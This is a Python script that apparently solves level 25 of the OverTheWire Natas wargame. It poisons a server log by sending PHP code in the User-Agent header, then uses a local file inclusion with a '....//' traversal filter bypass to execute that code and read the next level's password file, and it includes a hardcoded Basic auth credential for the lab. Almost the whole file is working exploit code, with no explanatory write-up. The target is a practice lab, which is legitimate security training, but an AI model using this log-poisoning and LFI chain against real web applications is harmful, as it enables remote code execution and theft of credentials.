

import requests
import copy
import re

proxies = {
    'http' : '127.0.0.1:8080',
    'https' : '127.0.0.1:8080'
}
authorization = 'Basic bmF0YXMyNTpHSEY2WDdZd0FDYVlZc3NIVlkwNWNGcTgzaFJrdGw0Yw=='

session = requests.Session() # cookies received will be stored in the session object

# Create a "Directory Traversal Attempt!" log entry, which also logs the "User-Agent" Header in the log file
# Logs are stored in /var/www/natas/natas25/logs/natas25_<session_id>.log
#
# Our PHP payload will dump the contents of the file "/etc/natas_webpass/natas26" as we cannot bypass the filter in order to 
# dump it with the LFI present in the "lang" parameter
php_payload='<?php echo "Password: " . file_get_contents("/etc/natas_webpass/natas26"); ?>'
r = session.get(
    'http://natas25.natas.labs.overthewire.org',
    params = {
        'lang' : '../'  # Triggers the logger
    },
    headers = {
        'Host' : 'natas25.natas.labs.overthewire.org',
        'Authorization' : authorization,
        'User-Agent' : php_payload  # will be written in the log file
    },
    proxies=proxies
)
assert(r.status_code != 401)

cookie = None
for c in session.cookies:
    if c.name == 'PHPSESSID' and c.domain == 'natas25.natas.labs.overthewire.org':
        cookie = c
        break
assert(cookie is not None)

# Using the PHP payload present in the log file, pefrom a Local File Inclusion (LFI) attack
prev_dir = '....//' # Filter bypass
r = session.get(
    'http://natas25.natas.labs.overthewire.org',
    params = {
        'lang' : '{}/logs/natas25_{}.log'.format(prev_dir, cookie.value)
    },
    headers = {
        'Host' : 'natas25.natas.labs.overthewire.org',
        'Authorization' : authorization
    },
    proxies=proxies
)

if 'Password:' in r.text:
    print("Credentials found!")
    match = re.search(r'.* Password: ([a-zA-Z0-9]+).*', r.text, re.MULTILINE)
    if match:    
        print("")
        print("Credentials for Natas level26")
        print("UN: natas26")
        print("PW: " + match.groups()[0])
        print("")
else:
    assert(False and 'Exploit is 100% reliable')
